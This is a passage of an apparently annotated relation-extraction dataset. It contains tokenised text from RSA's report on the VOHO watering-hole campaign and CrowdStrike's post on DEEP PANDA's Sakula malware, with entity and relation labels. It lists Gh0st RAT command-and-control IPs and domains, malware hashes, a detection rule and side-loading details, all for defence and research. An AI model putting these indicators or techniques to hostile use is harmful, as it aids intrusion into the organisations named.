["Phase", "2"], ["Phase", "2", ",", "which", "consisted", "of", "the", "above", "mentioned", "attack", "on", "the", "Sun", "Java", "client", ",", "began", "on", "July"], ["16", ",", "2012", ",", "when", "the", "first", "successful", "exploits", "of", "visiting", "java", "clients", "began", "to", "hit", "the", "exploit"], ["server", "at", "approximately", "7:46am", "EST", ".", "This", "exploit", "activity", "continued", "over", "the", "course", "of", "a", "few"], ["days", ",", "and", "ceased", "on", "July", "18", ",", "2012", ",", "at", "approximately", "9:12", "am", "EST", ",", "which", "was", "when", "the", "server"], ["administrator", "of", "*******curling", ".", "com", "brought", "the", "server", "down", "for", "compromise", "remediation", "."], ["16"], ["Overall", "Statistics"], ["Based", "on", "our", "analysis", ",", "a", "total", "of", "32", ",", "160", "unique", "hosts", ",", "representing", "731", "unique", "global"], ["organizations", ",", "were", "redirected", "from", "compromised", "web", "servers", "injected", "with", "the", "redirect", "iframe"], ["to", "the", "exploit", "server", ".", "Of", "these", "redirects", ",", "3", ",", "934", "hosts", "were", "seen", "to", "download", "the", "exploit", "CAB"], ["and", "JAR", "files", "(indicating", "a", "successful", "exploit/compromise", "of", "the", "visiting", "host)", ".", "This", "gives", "a"], ["\u201csuccess\u201d", "statistic", "of", "12%", ",", "which", "based", "on", "our", "previous", "understanding", "of", "exploit", "campaigns", ","], ["indicates", "a", "very", "successful", "campaign", "."], ["Figure", "13:", "Success", "of", "Compromise"], ["Total", "Exposure", "and", "Compromise"], ["35", ",", "000"], ["30", ",", "000"], ["25", ",", "000"], ["20", ",", "000"], ["15", ",", "000"], ["10", ",", "000"], ["5", ",", "000"], ["0"], ["Total", "Exposure", "by", "Redirect"], ["Total", "Compromises"], ["Of", "the", "listed", "sites", "used", "to", "redirect", "hosts", "to", "the", "exploit", "site", ",", "the", "top", "four", "redirecting", "web", "servers"], ["are", "as", "follows:"], ["Figure", "14:", "Top", "Four", "Redirect", "Sites"], ["With", "success", "rates", "per", "exploit", "type", "being", "split", "pretty", "much", "down", "the", "middle:"], ["17"], ["Exploit", "Breakdown"], ["Figure", "15:", "Exploit", "Breakdown"], ["CAB", "Downloads"], ["JAR", "Downloads"], ["Exploited", "Organization", "Breakdown"], ["Of", "the", "hosts", "above", "that", "downloaded", "the", "exploit", "CAB", "and", "JAR", "files", ",", "the", "RSA", "FirstWatch", "team"], ["further", "examined", "compromised", "organizations", "by", "identifying", "the", "visiting", "hosts", "and", "crossreferencing", "the", "IP", "addresses", "to", "the", "Autonomous", "Systems", "that", "they", "belonged", "to", "."], ["CAVEAT:", "Because", "we", "didn\u2019t", "have", "observation", "of", "the", "compromised", "host", "themselves", ",", "nor"], ["command", "and", "control", "traffic", ",", "our", "understanding", "of", "\u201ccompromise\u201d", "is", "strictly-related", "to", "observed"], ["HTTP", "traffic", ".", "This", "analysis", "would", "not", "take", "into", "account", "host", "or", "perimeter-based", "blocking"], ["systems", "at", "affected", "organizations", "."], ["With", "this", "data", "we", "then", "grouped", "those", "autonomous", "systems", "into", "the", "following", "industries:"], ["\u2022"], ["Corporate", "\u2013", "These", "systems", "were", "identified", "as", "being", "members", "of", "typical", "corporate"], ["networks", ",", "which", "included", "enterprises", "and", "business", ",", "as", "well", "as", "\u201cbusiness-class\u201d", "IP"], ["space", "in", "large", "ISP", "organizations", "."], ["\u2022"], ["Defense", "Industrial", "Base", "(DIB)", "\u2013", "These", "systems", "were", "systems", "in", "ASNs", "that", "were"], ["\u2022"], ["Local", "Government", "\u2013", "These", "systems", "were", "systems", "in", "networks", "identified", "as"], ["known", "to", "be", "involved", "with", "DIB", "consulting", ",", "systems", "and", "process", "."], ["government", "systems", "in", "various", "cities", ",", "counties", "and", "towns", "."], ["\u2022"], ["Internet", "Service", "Provider", "(ISP)", "-", "These", "systems", "were", "hosts", "in", "networks", "that", "were"], ["identified", "as", "common", "internet", "service", "provider", "space", ".", "This", "particular", "classification"], ["accounts", "largely", "for", "consumer-based", "internet", "users", ",", "but", "may", "also", "include", "corporate"], ["assets", "that", "aren\u2019t", "immediately", "identifiable", "by", "ASN", "examination", "."], ["\u2022"], ["Federal", "Government", "\u2013", "These", "systems", "are", "hosts", "in", "U", ".", "S.", "Government", "IP", "space", "or"], ["Washington", "DC", "area", "local", "government", "space", ".", "This", "would", "include", "Federal", "agencies"], ["and", "support", "organizations", "."], ["\u2022"], ["Educational", "Institutions", "(EDU)", "\u2013", "These", "systems", "were", "hosts", "in", "networks", "identified"], ["as", "educational", "institutions", ".", "Much", "like", "ISP", "traffic", ",", "this", "traffic", "is", "difficult", "to", "breakdown"], ["into", "more", "specific", "identifying", "information", "."], ["\u2022"], ["Financial", "Services", "Organizations", "\u2013", "These", "systems", "were", "systems", "in", "identifiable"], ["Bank", ",", "Credit", "Union", ",", "Trading", "and", "other", "organizations", "related", "to", "financial", "services", "."], ["\u2022"], ["Healthcare", "-", "These", "systems", "were", "hosts", "in", "identifiable", "healthcare", "industry", "space", "."], ["This", "would", "include", "hospital", ",", "pharmaceutical", ",", "patient", "services", "and", "clinic", "space", "."], ["\u2022"], ["Other", "Government", "\u2013", "These", "systems", "were", "national", "government", "systems", "identified", "in"], ["foreign", "IP", "space", "or", "global", "government", "organizations", "(example:", "United", "Nations)"], ["\u2022"], ["Utilities", "/", "SCADA", "-", "These", "systems", "were", "hosts", "identified", "in", "organizations", "that", "supply"], ["or", "support", "utility", "or", "SCADA-related", "services", "such", "as", "Energy", "and", "water", "services", "."], ["18"], ["Figure", "16:", "Compromises", "by", "Industry"], ["Compromises", "by", "Industry"], ["UTILITIES", "/", "SCADA"], ["OTHER", "GOVT"], ["LOCAL", "GOVT"], ["ISP"], ["HEALTHCARE"], ["FINANCIAL"], ["FED", "GOVT"], ["EDU"], ["DIB"], ["CORPORATE"], ["0"], ["500"], ["1", ",", "000"], ["1", ",", "500"], ["2", ",", "000"], ["2", ",", "500"], ["By", "removing", "ISP", "traffic", ",", "we", "are", "better", "able", "to", "examine", "the", "other", "industries:"], ["Figure", "17:", "Compromise", "by", "Industry"], ["without", "ISP"], ["Compromise", "By", "Industry", "(without", "ISP)"], ["UTILITIES", "/", "SCADA"], ["OTHER", "GOVT"], ["LOCAL", "GOVT"], ["HEALTHCARE"], ["FINANCIAL"], ["FED", "GOVT"], ["EDU"], ["DIB"], ["CORPORATE"], ["0"], ["200"], ["400"], ["600"], ["800"], ["Linked", "Campaigns"], ["Wsdhealthy", ".", "com", "xxixii"], ["Based", "on", "our", "understanding", "of", "this", "campaign", "and", "TTPs", "(tools", ",", "techniques", "and", "procedures)"], ["used", ",", "we", "believe", "the", "following", "malware", "samples", "observed", "in", "January", "2012", "are", "related", "and"], ["belong", "to", "the", "same", "threat", "actors", "."], ["03db29c71b0031af08081f5e2f7dcdf2"], ["644161889f0f60885b2a0eec12038b66"], ["19"], ["These", "samples", "communicated", "with", "C2", "at", "58", ".", "64.143.245.", "This", "IP", "address", "has", "resolved", "to", "the"], ["following", "DNS", "names", "in", "the", "past:"], ["usc-data", ".", "suroot.com"], ["usa-mail", ".", "scieron.com"], ["dll", ".", "freshdns.org"], ["Delivery", "of", "these", "samples", "appeared", "to", "be", "a", "similar", "attack", "vector", ",", "that", "being", "a", "hacked", "server"], ["that", "was", "redirected", "to", "by", "iframe", "insertion:"], ["www", ".", "wsdhealthy.com"], ["Using", "the", "following", "URLs:"], ["www", ".", "wsdhealthy.com/userfiles/file/Applet19.html"], ["www", ".", "wsdhealthy.com/userfiles/file/Applet19.exe"], ["www", ".", "wsdhealthy.com/userfiles/file/Applet.html"], ["www", ".", "wsdhealthy.com/userfiles/file/Applet.jar"], ["www", ".", "wsdhealthy.com/userfiles/file/Applet.exe"], ["This", "file", "structure", "indicates", "a", "similar", "java", "exploitation", ",", "and", "while", "we", "didn\u2019t", "have", "direct"], ["observation", "of", "this", "campaign", ",", "open", "source", "intelligence", "indicates", "a", "possible", "exploit", "of:"], ["CVE\u20132011-3544", "-", "Unspecified", "vulnerability", "in", "the", "Java", "Runtime", "Environment"], ["Additionally", ",", "the", "Gh0st", "RAT", "variant", "used", "in", "this", "campaign", "matched", "identifiers", "used", "in", "the"], ["VOHO", "campaign", "."], ["Detection", "and", "Indicators", "of", "Compromise"], ["Network"], ["For", "network", "detection", "of", "this", "threat", ",", "users", "should", "look", "for", "historic", "traffic", "to", "the", "following", "IPs"], ["and", "Domains:"], ["IP", "Addresses"], ["58", ".", "64.155.59", "(gh0st", "RAT", "C2)"], ["58", ".", "64.155.57", "(gh0st", "RAT", "C2)"], ["58", ".", "64.143.245", "(gh0st", "RAT", "C2)"], ["Domains"], ["wsdhealthy", ".", "com", "(legitimate", "site", "hosting", "exploit", "code/malware)"], ["*******curling", ".", "com", "(legitimate", "site", "hosting", "exploit", "code/malware)"], ["usc-data", ".", "suroot.com", "(gh0st", "RAT", "C2)"], ["usa-mail", ".", "scieron.com", "(gh0st", "RAT", "C2)"], ["dll", ".", "freshdns.org", "(gh0st", "RAT", "C2)"], ["20"], ["Gh0st", "RAT"], ["Generically", ",", "gh0st", "RAT", "communication", "using", "the", "unmodified", "source", "code", "can", "be", "detected", "by"], ["looking", "for", "non-RFC", "compliant", "network", "traffic", "on", "allowed", "paths", ",", "which", "contain", "the", "string"], ["\u201cGh0st\u201d", "in", "the", "first", "view", "five", "bytes", "of", "the", "packet", "payload", ".", "Because", "this", "is", "a", "commonly", "used"], ["tactic", "to", "detect", "Gh0st", "on", "the", "network", ",", "attackers", "often", "change", "this", "string", "to", "avoid", "detection", ".", "In"], ["the", "case", "of", "the", "VOHO", "compromise", ",", "this", "indicator", "is", "\u201cHTTPS\u201d", "."], ["Known", "Malicious", "MD5", "Hashes"], ["03db29c71b0031af08081f5e2f7dcdf2"], ["644161889f0f60885b2a0eec12038b66"], ["e6b43c299a9a1f5abd9be2b729e54577"], ["2fe340fe2574ae540bd98bd9af8ec67d"], ["RSA", "NetWitness", "Indicators"], ["ip", ".", "dst", "=", "58", ".", "64.155.59,58.64.155.57,58.64.143.245,64.26.174.74", "||", "alias", ".", "host", "="], ["www", ".", "wsdhealthy.com", ",usc-data", ".", "suroot.com,usa-mail.scieron.com,dll.freshdns.org"], ["Additionally", ",", "the", "following", "feeds", "and", "parsers", "from", "RSA", "NetWitness", "Live", "service", "can", "be", "used", "for"], ["additional", "Gh0st", "RAT", "detection", "."], ["Gh0st", "parser"], ["APT-domains", "feed"], ["APT-IPs", "feed"], ["Conclusions"], ["RSA", "FirstWatch", "research", "has", "revealed", "an", "exploit", "and", "compromise", "campaign", "with", "connections"], ["over", "the", "past", "8", "months", ".", "The", "collected", "data", "suggests", "that", "this", "attack", "was", "orchestrated", "and"], ["carried", "out", "by", "threat", "actors", "commonly", "referred", "to", "in", "the", "industry", "as", "\u201cAPT\u201d:"], ["1)"], ["2)"], ["3)"], ["4)"], ["5)"], ["6)"], ["Use", "of", "the", "\u201cxKungFoo\u201d", "script", "kit", "for", "victim", "redirection"], ["Use", "of", "attack", "methodology", "that", "matches", "motives", "seen", "in", "past", "APT", "attacks", "\u2013", "most"], ["notably", "such", "as", "those", "seen", "in", "the", "Aurora", "and", "GhostNet", "campaigns"], ["Use", "of", "the", "\u201cgh0st\u201d", "remote", "access", "tool", "(RAT)", "in", "this", "and", "previous", "campaigns"], ["Use", "of", "command", "and", "control", "infrastructure", "in", "the", "Hong", "Kong", "area", "in", "this", "and", "previous"], ["campaigns"], ["Gross", "impact", "and", "on", "almost", "900", "unique", "organizations"], ["Targets", "of", "Interest", "and", "Opportunity", "being", "geographically", "disperse", "in", "addition", "to"], ["industrial", "&", "vertical", "diverse", "with", "a", "heavy", "concentration", "in", "the", "following", "areas:"], ["\u2022", "International", "finance", "&", "banking"], ["\u2022", "Technology"], ["\u2022", "Government", "\u2013", "municipal", ",", "state", ",", "federal", "and", "international"], ["\u2022", "Utilities", "&", "energy"], ["\u2022", "Educational"], ["\u2022", "Defense", "Industrial", "Base", "(DIB)"], ["\u2022", "Corporate", "Enterprise"], ["The", "possibility", "exists", "that", "this", "was", "intentional", "misdirection", "on", "the", "part", "of", "the", "attackers", "in"], ["regards", "to", "their", "origin", ".", "However", ",", "the", "RSA", "FirstWatch", "team", "believes", "the", "data", "supports", "our"], ["analysis", "and", "this", "is", "further", "evidence", "of", "APT", "intrusion", "into", "United", "States", "government", "and"], ["corporate", "assets", "."], ["21"], ["Disclaimer"], ["RSA", "Security", "LLC", "(\u201cRSA\u201d)", "believes", "the", "information", "in", "this", "publication", "is", "accurate", "as", "of"], ["its", "publication", "date", ".", "RSA", "disclaims", "any", "obligation", "to", "update", "after", "the", "date", "hereof", ".", "The"], ["information", "is", "subject", "to", "update", "without", "notice", ".", "The", "analysis", "may", "include", "technical", "or"], ["other", "inaccuracies", "and/or", "typographical", "errors", "."], ["THE", "INFORMATION", "IN", "THIS", "PUBLICATION", "IS", "PROVIDED", "TO", "FOR", "INFORMATIONAL"], ["PURPOSES", "ONLY", ",", "IS", "PROVIDED", "\"AS", "IS", ",", "\"", "AND", "SHALL", "NOT", "BE", "CONSIDERED", "PRODUCT"], ["DOCUMENTATION", "OR", "SPECIFICATIONS", "UNDER", "THE", "TERMS", "OF", "ANY", "LICENSE", "OR"], ["SIMILAR", "AGREEMENT", ".", "RSA", "MAKES", "NO", "REPRESENTATIONS", "OR", "WARRANTIES", "OF", "ANY"], ["KIND", "WITH", "RESPECT", "TO", "THE", "INFORMATION", "IN", "THIS", "PUBLICATION", ",", "AND", "SPECIFICALLY"], ["DISCLAIMS", "IMPLIED", "WARRANTIES", "OF", "MERCHANTABILITY", "OR", "FITNESS", "FOR", "A"], ["PARTICULAR", "PURPOSE", "."], ["i"], ["http://www", ".", "wired.com/threatlevel/2010/01/operation-aurora/"], ["http://www", ".", "scribd.com/doc/13731776/Tracking-GhostNet-Investigating-a-Cyber-EspionageNetwork"], ["iii"], ["http://googleonlinesecurity", ".", "blogspot.com/2012/06/security-warnings-for-suspected-state.html"], ["iv"], ["http://contagiodump", ".", "blogspot.com/2011/02/targeted-attacks-against-personal.html"], ["v"], ["http://thediplomat", ".", "com/flashpoints-blog/2011/06/07/china-cyber-attack-fallacies/"], ["vi"], ["http://www", ".", "yunsec.net/a/school/bdzs/fmuma/2010/0602/4175.html"], ["vii"], ["http://www", ".", "yunsec.net/a/school/bdzs/fmuma/2010/0602/4175.html"], ["viii"], ["http://www", ".", "zdnet.com/blog/security/state-sponsored-attackers-using-ie-zero-day-to-hijack-gmailaccounts/12462"], ["ix"], ["http://www", ".", "mcafee.com/us/resources/white-papers/foundstone/wp-know-your-digital-enemy.pdf"], ["x"], ["http://www", ".", "malwaredomainlist.com/mdl.php?search=wsdhealthy.com&colsearch=All&quantity=50"], ["xi"], ["http://www", ".", "mywot.com/en/scorecard/wsdhealthy.com"], ["xii"], ["http://www", ".", "malwaregroup.com/domains/details/wsdhealthy.com"], ["ii"], ["ABOUT", "RSA"], ["RSA", ",", "The", "Security", "Division", "of", "EMC", ",", "is", "the", "premier", "provider", "of", "security", ",", "risk"], ["and", "compliance", "management", "solutions", "for", "business", "acceleration", ".", "RSA", "helps"], ["the", "world\u2019s", "leading", "organizations", "succeed", "by", "solving", "their", "most", "complex"], ["and", "sensitive", "security", "challenges", ".", "These", "challenges", "include", "managing"], ["organizational", "risk", ",", "safeguarding", "mobile", "access", "and", "collaboration", ",", "proving"], ["compliance", ",", "and", "securing", "virtual", "and", "cloud", "environments", "."], ["Combining", "business-critical", "controls", "in", "identity", "assurance", ",", "encryption", "&"], ["key", "management", ",", "SIEM", ",", "Data", "Loss", "Prevention", "and", "Fraud", "Protection", "with"], ["industry", "leading", "eGRC", "capabilities", "and", "robust", "consulting", "services", ",", "RSA"], ["brings", "visibility", "and", "trust", "to", "millions", "of", "user", "identities", ",", "the", "transactions", "that"], ["they", "perform", "and", "the", "data", "that", "is", "generated", ".", "For", "more", "information", ",", "please"], ["visit", "www", ".", "RSA.com", "and", "www", ".", "EMC.com."], ["EMC2", ",", "EMC", ",", "RSA", ",", "FirstWatch", ",", "NetWitness", "and", "the", "RSA", "logo", "are", "registered", "trademarks", "or", "trademarks", "of"], ["EMC", "Corporation", "in", "the", "United", "States", "and", "other", "countries", ".", "All", "other", "trademarks", "used", "herein", "are", "the"], ["property", "of", "their", "respective", "owners", ".", "\u00a92012", "EMC", "Corporation", ".", "All", "rights", "reserved", ".", "Published", "in", "the", "USA", "."], ["www", ".", "emc.com/rsa"]]}], [{"vertexSet": [{"old_id": "T1", "type": "Organization", "name": "CrowdStrike Intelligence", "sent_id": 6, "pos": [7, 8]}, {"old_id": "T2", "type": "ExploitTargetObject", "name": "US Defense Industrial Base", "sent_id": 7, "pos": []}, {"old_id": "T3", "type": "Malware", "name": "Sakula", "sent_id": 8, "pos": [11]}, {"old_id": "T4", "type": "Attacker", "name": "DEEP PANDA", "sent_id": 10, "pos": [7, 8]}, {"old_id": "T5", "type": "Malware", "name": "Sakula", "sent_id": 16, "pos": [1]}, {"old_id": "T6", "type": "Malware", "name": "PlugX", "sent_id": 17, "pos": [5]}, {"old_id": "T7", "type": "File", "name": "MediaSoftexe", "sent_id": 17, "pos": []}, {"old_id": "T8", "type": "MD5", "name": "d00b3169f45e74bb22a1cd684341b14a", "sent_id": 18, "pos": []}, {"old_id": "T9", "type": "MD5", "name": "ae6f33f6cdc25dc4bda24b2bccff79fe", "sent_id": 19, "pos": []}, {"old_id": "T10", "type": "File", "name": "msidll", "sent_id": 18, "pos": []}, {"old_id": "T11", "type": "Malware", "name": "Sakula", "sent_id": 19, "pos": [12]}, {"old_id": "T12", "type": "MD5", "name": "0c2674c3a97c53082187d930efb645c2", "sent_id": 20, "pos": []}, {"old_id": "T13", "type": "Organization", "name": "DTOPTOOLZ Co Ltd", "sent_id": 21, "pos": [6, 10]}, {"old_id": "T14", "type": "Address", "name": "180210206246", "sent_id": 23, "pos": []}, {"old_id": "T15", "type": "Time", "name": "April 2014", "sent_id": 24, "pos": [10, 11]}, {"old_id": "T16", "type": "Time", "name": "August 2014", "sent_id": 25, "pos": [30, 31]}, {"old_id": "T17", "type": "Software", "name": "Adobe Reader", "sent_id": 28, "pos": [7, 8]}, {"old_id": "T18", "type": "Software", "name": "Juniper VPN", "sent_id": 28, "pos": [10, 11]}, {"old_id": "T19", "type": "Software", "name": "Microsoft ActiveX Control", "sent_id": 28, "pos": []}, {"old_id": "T20", "type": "Software", "name": "Microsoft ActiveX", "sent_id": 41, "pos": [10, 11]}, {"old_id": "T21", "type": "Malware", "name": "Sakula", "sent_id": 42, "pos": [1]}, {"old_id": "T22", "type": "Malware", "name": "Sakula", "sent_id": 42, "pos": [1]}, {"old_id": "T23", "type": "Indicator", "name": "www[]xha-mster[]com", "sent_id": 44, "pos": []}, {"old_id": "T24", "type": "Time", "name": "midSeptember", "sent_id": 44, "pos": [14]}, {"old_id": "T25", "type": "Email", "name": "wendellom@yahoocom", "sent_id": 44, "pos": []}, {"old_id": "T26", "type": "Attacker", "name": "tonyy starke", "sent_id": 45, "pos": []}, {"old_id": "T27", "type": "Campaign", "name": "DEEP PANDA", "sent_id": 46, "pos": [10, 11]}, {"old_id": "T28", "type": "Address", "name": "19820045112", "sent_id": 48, "pos": []}, {"old_id": "T29", "type": "Campaign", "name": "DEEP PANDA", "sent_id": 48, "pos": [12, 13]}, {"old_id": "T30", "type": "Time", "name": "September 2014", "sent_id": 50, "pos": [1, 2]}, {"old_id": "T31", "type": "Indicator", "name": "vpn[]foundationssl[]com", "sent_id": 52, "pos": []}, {"old_id": "T32", "type": "Organization", "name": "CrowdStrike", "sent_id": 53, "pos": [2]}, {"old_id": "T33", "type": "Campaign", "name": "DEEP PANDA", "sent_id": 53, "pos": [9, 10]}, {"old_id": "T34", "type": "Indicator", "name": "foundationssl[]com", "sent_id": 57, "pos": []}, {"old_id": "T35", "type": "Indicator", "name": "news[]foundationssl[]com", "sent_id": 60, "pos": []}, {"old_id": "T36", "type": "Indicator", "name": "foundationssl[]com", "sent_id": 61, "pos": []}, {"old_id": "T37", "type": "Campaign", "name": "DEEP PANDA", "sent_id": 61, "pos": []}], "labels": [{"old_id": "R1", "r": "P2", "h": 3, "t": 2, "evidence": []}, {"old_id": "R2", "r": "P21", "h": 9, "t": 4, "evidence": []}, {"old_id": "R3", "r": "P21", "h": 6, "t": 4, "evidence": []}, {"old_id": "R4", "r": "P21", "h": 7, "t": 4, "evidence": []}, {"old_id": "R5", "r": "P21", "h": 8, "t": 4, "evidence": []}, {"old_id": "R6", "r": "P21", "h": 11, "t": 10, "evidence": []}, {"old_id": "R7", "r": "P33", "h": 10, "t": 14, "evidence": [19, 20, 21, 22, 23, 24]}, {"old_id": "R8", "r": "P33", "h": 10, "t": 15, "evidence": [19, 20, 21, 22, 23, 24, 25]}, {"old_id": "R9", "r": "P28", "h": 10, "t": 13, "evidence": [19, 20, 21, 22, 23]}, {"old_id": "R10", "r": "P21", "h": 22, "t": 21, "evidence": []}, {"old_id": "R11", "r": "P33", "h": 21, "t": 23, "evidence": [42, 43, 44]}, {"old_id": "R12", "r": "P21", "h": 24, "t": 21, "evidence": []}, {"old_id": "R13", "r": "P2", "h": 25, "t": 21, "evidence": []}], "title": ["inputs/txt/201411CrowdStrikeDeepPanda"], "sents": [["", "."], ["I", "am", "Ironman:", "DEEP", "PANDA", "Uses", "Sakula", "Malware"], ["to", "Target", "Organizations", "in", "Multiple", "Sectors"], ["THE", "ADVERSARY", "LINE-UP"], ["24", "NOV", "2014"], ["MATT", "DAHL"], ["Over", "the", "last", "few", "months", ",", "the", "CrowdStrike", "Intelligence", "team", "has", "been", "tracking", "a", "campaign", "of"], ["highly", "targeted", "events", "focused", "on", "entities", "in", "the", "U", ".", "S.", "Defense", "Industrial", "Base", "(DIB)", ",", "healthcare", ","], ["government", ",", "and", "technology", "sectors", ".", "This", "campaign", "infected", "victims", "with", "Sakula", "malware"], ["variants", "that", "were", "signed", "with", "stolen", "certi\ufb01cates", ".", "Investigation", "into", "this", "activity", "led", "to", "associations"], ["with", "the", "adversary", "known", "to", "CrowdStrike", "as", "DEEP", "PANDA", "."], ["On", "31", "July", "2014", ",", "an", "executable", "was", "identi\ufb01ed", ",", "which", ",", "at", "the", "time", ",", "was", "not", "detected", "by", "any", "antivirus", "products", ".", "When", "this", "\ufb01le", "was", "executed", ",", "it", "caused", "the", "victim", "to", "view", "a", "website", "by", "using", "the"], ["ShellExecute()", "API", "to", "open", "a", "URL", ".", "The", "site\u2019s", "domain", "name", "was", "meant", "to", "spoof", "that", "of", "a", "site", "set"], ["up", "to", "provide", "information", "on", "an", "alumni", "event", "for", "a", "U", ".", "S", "university", ".", "This", "page", "requested", "that", "the"], ["visitor", "download", "an", "Adobe-related", "plugin", "in", "order", "to", "view", "the", "content", ".", "The", "downloaded", "plugin", "\ufb01le"], ["included", "a", "variant", "of", "Sakula", "malware", ".", "[1]"], ["The", "Sakula", "malware", "in", "this", "campaign", "utilized", "the", "Dynamic", "Link", "Library", "(DLL)", "side-loading"], ["technique", "most", "commonly", "associated", "with", "PlugX", "activity", ".", "In", "the", "aforementioned", "universityrelated", "incidents", ",", "a", "legitimate", "executable", "named", "MediaSoft", ".", "exe", "(MD5", "hash:"], ["d00b3169f45e74bb22a1cd684341b14a)", "loaded", "a", "\ufb01le", "named", "msi", ".", "dll", "(MD5", "hash:"], ["ae6f33f6cdc25dc4bda24b2bccff79fe)", ",", "which", ",", "in", "turn", ",", "was", "used", "to", "load", "the", "Sakula", "executable"], ["(MD5", "hash:", "0c2674c3a97c53082187d930efb645c2)", ".", "This", "\ufb01nal", "executable", "was", "also", "signed", "with", "a"], ["certi\ufb01cate", "assigned", "to", "an", "organization", "called", "DTOPTOOLZ", "Co", ".", ",", "Ltd", "."], ["Command-and-Control", "(C2)", "communications", "in", "this", "incident", "went", "directly", "to", "IP", "address"], ["180", ".", "210.206.246;", "a", "sample", "GET", "request", "is", "below:"], ["Further", "investigation", "revealed", "similar", "activity", "stretching", "back", "to", "at", "least", "April", "2014", ",", "when", "similar"], ["TTPs", "were", "used", "to", "target", "a", "healthcare", "organization", "and", "a", "U", ".", "S.-based", "IT", "company", "with", "highpro\ufb01le", "clients", "in", "the", "defense", "sector", ".", "Two", "other", "incidents", "were", "also", "identi\ufb01ed", "in", "August", "2014"], ["targeting", "a", "company", "in", "the", "DIB", "and", "a", "Mongolian", "government", "entity", "."], ["All", "incidents", "in", "this", "campaign", "were", "similar", "in", "that", "they", "utilized", "malicious", "droppers", "masquerading"], ["as", "installers", "for", "legitimate", "software", "applications", "like", "Adobe", "Reader", ",", "Juniper", "VPN", ",", "and", "Microsoft"], ["ActiveX", "Control", ".", "They", "display", "progress", "bars", "that", "make", "it", "appear", "as", "if", "the", "speci\ufb01ed", "software", "is"], ["being", "updated", "or", "installed", "."], ["Example", "of", "Installer", "Progress", "Bar", "Displayed", "by", "Dropper"], ["In", "addition", ",", "the", "droppers", "all", "directed", "victims", "to", "login", "pages", "for", "services", "speci\ufb01c", "to", "the", "target"], ["organization", "like", "webmail", ",", "document", "sharing", ",", "or", "corporate", "VPN", ".", "In", "all", "cases", "except", "one", ",", "the"], ["victims", "were", "directed", "to", "legitimate", "login", "pages", ".", "The", "one", "exception", "was", "a", "case", "in", "which", "victims"], ["were", "sent", "to", "a", "login", "page", "hosted", "on", "a", "domain", "that", "spoofed", "that", "of", "the", "legitimate", "one", ".", "It", "is", "unclear"], ["whether", "redirecting", "victims", "to", "these", "login", "pages", "was", "part", "of", "credential-collection", "activity", "or", "merely"], ["meant", "to", "deceive", "victims", "into", "believing", "that", "the", "activity", "was", "legitimate", "."], ["Example", "of", "a", "Login", "Page", "that", "Victims", "were", "Redirected", "to"], ["The", "campaign", "appeared", "to", "be", "over", "by", "the", "end", "of", "August", ",", "but", "a", "\ufb01le", "was", "recently", "discovered", "that"], ["suggests", "it", "may", "be", "ongoing", ".", "The", "intended", "target", "again", "appeared", "to", "be", "a", "Mongolian", "government"], ["entity", ",", "and", "the", "\ufb01le", "masqueraded", "as", "an", "installer", "for", "Microsoft", "ActiveX", "software", ".", "It", "dropped", "the"], ["side-loaded", "Sakula", "malware", "just", "like", "in", "the", "other", "incidents;", "however", ",", "in", "this", "instance", ",", "the", "Sakula"], ["payload", "was", "signed", "with", "a", "certi\ufb01cate", "assigned", "to", "a", "different", "organization", ",", "Career", "Credit", "Co", ".", ",", "Ltd", "."], ["The", "malware", "used", "the", "domain", "www[", ".", "]xha-mster[.]com", "for", "C2", "which", "was", "created", "in", "midSeptember", "and", "is", "registered", "with", "the", "email", "address", "wendellom@yahoo", ".", "com", "and", "registrant", "name"], ["\u201ctonyy", "starke\u201d", "(hence", "the", "name", ",", "Ironman-related", "title", "for", "this", "blog)", "."], ["Below", "is", "a", "chart", "showing", "the", "relevant", "relationships", "to", "this", "DEEP", "PANDA", "campaign", "."], ["The", "bottom", "of", "the", "chart", "shows", "an", "infrastructure", "connection", "between", "an", "IP", "address"], ["(198", ".", "200.45.112)", "used", "this", "campaign", "and", "also", "used", "in", "recently", "observed", "DEEP", "PANDA", "activity", "."], ["Association", "with", "Recent", "Scanbox", "Activity"], ["In", "September", "2014", ",", "CrowdStrike", "Intelligence", "identi\ufb01ed", "a", "malicious", "\ufb01le", "signed", "with", "the"], ["DTOPTOOLZ", "Co", ".", ",", "Ltd", ".", "certi\ufb01cate", ".", "Analysis", "of", "this", "\ufb01le", "revealed", "it", "to", "be", "Derusbi", "malware", "(a", "favorite"], ["RAT", "of", "DEEP", "PANDA)", "that", "used", "the", "domain", "vpn[", ".", "]foundationssl[.]com", "for", "its", "C2", ".", "At", "the", "time", "of"], ["discovery", ",", "CrowdStrike", "did", "not", "attribute", "the", "\ufb01le", "to", "DEEP", "PANDA", "based", "on", "the", "malware", "alone", ","], ["but", "the", "use", "of", "the", "DTOPTOOLZ", "certi\ufb01cate", "to", "sign", "a", "malware", "variant", "known", "to", "be", "heavily", "used", "by"], ["this", "adversary", "makes", "it", "likely", "that", "this", "signed", "Derusbi", "sample", "is", "also", "attributable", "to", "DEEP"], ["PANDA", "."], ["In", "a", "recent", "public", "report", "from", "PWC", ",", "another", "foundationssl[", ".", "]com", "domain", "was", "linked", "to", "activity"], ["involving", "the", "Strategic", "Web", "Compromise", "(SWC)", "framework", "more", "commonly", "known", "as"], ["Scanbox", ".", "In", "that", "operation", ",", "the", "Scanbox", "code", "was", "placed", "on", "the", "website", "of", "a", "U", ".", "S.-based", "think"], ["tank", "and", "utilized", "the", "malicious", "domain", ",", "news[", ".", "]foundationssl[.]com.", "The", "use", "of", "the", "two"], ["foundationssl[", ".", "]com", "subdomains", "suggests", "that", "the", "same", "adversary", "(in", "this", "case", "DEEP", "PANDA)"], ["was", "responsible", "for", "the", "signed", "Derusbi", "malware", "\ufb01le", "and", "the", "think", "tank", "SWC", "activity", "."], ["Furthermore", ",", "CrowdStrike", "publicly", "reported", "on", "DEEP", "PANDA", "targeting", "of", "think", "tanks", "in", "July"], ["2014", "."], ["If", "you", "want", "to", "hear", "more", "about", "DEEP", "PANDA", "and", "their", "tradecraft", "or", "any", "of", "the", "other", "adversaries"], ["that", "CrowdStrike", "tracks", ",", "please", "contact:", "sales@crowdstrike", ".", "com"], ["[1]", "In", "February", "2014", ",", "CrowdStrike", "publicly", "reported", "on", "a", "campaign", "that", "leveraged", "Sakula"], ["malware", "(http://www", ".", "crowdstrike.com/blog/french-connection-french-aerospace-focused-cve-"], ["2014-0322-attack-shares-similarities-2012/index", ".", "html);", "however", ",", "the", "Tactics", ",", "Techniques", ",", "and"], ["Procedures", "(TTPs)", "between", "that", "campaign", "and", "this", "recent", "one", "are", "different", ",", "suggesting", "two"], ["distinct", "adversaries", "are", "using", "the", "Sakula", "malware", "."], ["5"], ["40"], ["\u2190", 